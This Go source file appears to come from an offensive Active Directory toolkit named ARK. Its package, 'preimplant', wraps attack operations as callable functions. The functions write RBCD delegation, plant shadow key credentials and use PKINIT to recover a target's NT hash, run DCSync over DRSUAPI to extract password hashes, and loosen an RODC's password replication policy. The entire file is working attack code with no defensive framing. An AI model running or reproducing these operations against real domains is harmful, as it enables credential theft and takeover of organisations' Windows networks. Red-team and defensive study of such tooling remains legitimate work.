package preimplant

import (
	"fmt"

	"github.com/KKingZero/ARK/pkg/drs"
	"github.com/KKingZero/ARK/pkg/krb"
	"github.com/KKingZero/ARK/pkg/ldapcli"
	"github.com/KKingZero/ARK/pkg/smbcli"
)

// LDAPSet writes one attribute (LDAPS). Same path as `ark ldap set`.
func LDAPSet(opts ldapcli.Options, target, attr, value string) error {
	opts.RequireTLS = true
	conn, err := ldapcli.Bind(opts)
	if err != nil {
		return err
	}
	defer conn.Close()
	base := ldapcli.BaseDN(opts.Domain)
	if base == "" {
		return fmt.Errorf("domain required")
	}
	return ldapcli.SetAttr(conn, base, target, attr, value)
}

// RBCDWrite is `ark rbcd write` without flag parsing.
func RBCDWrite(opts ldapcli.Options, to, from string) (ldapcli.RBCDState, error) {
	opts.RequireTLS = true
	conn, err := ldapcli.Bind(opts)
	if err != nil {
		return ldapcli.RBCDState{}, err
	}
	defer conn.Close()
	base := ldapcli.BaseDN(opts.Domain)
	if base == "" {
		return ldapcli.RBCDState{}, fmt.Errorf("domain required")
	}
	return ldapcli.WriteRBCD(conn, base, to, from)
}

// RBCDClear is `ark rbcd clear` without flag parsing.
func RBCDClear(opts ldapcli.Options, to, from string) (ldapcli.RBCDState, error) {
	opts.RequireTLS = true
	conn, err := ldapcli.Bind(opts)
	if err != nil {
		return ldapcli.RBCDState{}, err
	}
	defer conn.Close()
	return ldapcli.ClearRBCD(conn, ldapcli.BaseDN(opts.Domain), to, from)
}

// ShadowAuto plants a key credential and attempts PKINIT UnPAC.
func ShadowAuto(opts ldapcli.Options, target, out string) (msg string, err error) {
	opts.RequireTLS = true
	conn, err := ldapcli.Bind(opts)
	if err != nil {
		return "", err
	}
	defer conn.Close()
	base := ldapcli.BaseDN(opts.Domain)
	if out == "" {
		out = target + ".pfx"
	}
	cred, err := ldapcli.GenerateKeyCredential(target)
	if err != nil {
		return "", err
	}
	if err := ldapcli.WriteKeyCredentialPFX(out, cred.PFX); err != nil {
		return "", err
	}
	st, err := ldapcli.WriteShadow(conn, base, target, cred.Blob)
	if err != nil {
		return "", err
	}
	res, err := krb.PKINIT(krb.PKINITOptions{
		Domain: opts.Domain, Username: target, KDC: opts.Host, PFXPath: out,
	})
	if err != nil {
		return fmt.Sprintf("OK shadow auto %s pfx=%s (pkinit: %v)", st.TargetSAM, out, err), nil
	}
	return fmt.Sprintf("OK shadow auto %s pfx=%s NT %s", st.TargetSAM, out, res.NTHash), nil
}

// ShadowClear is `ark ad shadow clear`.
func ShadowClear(opts ldapcli.Options, target string) (string, error) {
	opts.RequireTLS = true
	conn, err := ldapcli.Bind(opts)
	if err != nil {
		return "", err
	}
	defer conn.Close()
	st, err := ldapcli.ClearShadow(conn, ldapcli.BaseDN(opts.Domain), target)
	if err != nil {
		return "", err
	}
	return fmt.Sprintf("OK shadow clear %s", st.TargetSAM), nil
}

// DCSync replicates one object over DRSUAPI (same as `ark ad dcsync`).
func DCSync(opts ldapcli.Options, target, ticket string) (string, error) {
	conn, err := ldapcli.Bind(opts)
	if err != nil {
		return "", err
	}
	e, err := ldapcli.LookupSAM(conn, ldapcli.BaseDN(opts.Domain), target)
	conn.Close()
	if err != nil {
		return "", err
	}
	if ticket == "" {
		if opts.Password == "" {
			return "", fmt.Errorf("dcsync needs password (asktgt) or ticket")
		}
		m, err := krb.AskTGT(krb.AskTGTOptions{
			Domain: opts.Domain, Username: opts.Username, Password: opts.Password, KDC: opts.Host,
		})
		if err != nil {
			return "", err
		}
		ticket = m.CCache
	}
	s, err := smbcli.DialKerberos(smbcli.Options{Host: opts.Host, Domain: opts.Domain, Ticket: ticket})
	if err != nil {
		return "", err
	}
	defer s.Close()
	res, err := drs.ReplicateObject(s, e.DN)
	if err != nil {
		return "", err
	}
	res.SAM = e.GetAttributeValue("sAMAccountName")
	return fmt.Sprintf("OK dcsync sam=%s nt=%s", res.SAM, res.NTHash), nil
}

// PRPClearNeverReveal is `ark ad prp clear-never-reveal`.
func PRPClearNeverReveal(opts ldapcli.Options, rodc string) (string, error) {
	opts.RequireTLS = true
	conn, err := ldapcli.Bind(opts)
	if err != nil {
		return "", err
	}
	defer conn.Close()
	dn, err := ldapcli.ClearNeverReveal(conn, ldapcli.BaseDN(opts.Domain), rodc)
	if err != nil {
		return "", err
	}
	return "OK prp clear-never-reveal " + dn, nil
}

// PRPAddReveal is `ark ad prp add-reveal`.
func PRPAddReveal(opts ldapcli.Options, rodc, group string) (string, error) {
	opts.RequireTLS = true
	conn, err := ldapcli.Bind(opts)
	if err != nil {
		return "", err
	}
	defer conn.Close()
	dn, err := ldapcli.AddRevealOnDemand(conn, ldapcli.BaseDN(opts.Domain), rodc, group)
	if err != nil {
		return "", err
	}
	return "OK prp add-reveal " + dn, nil
}
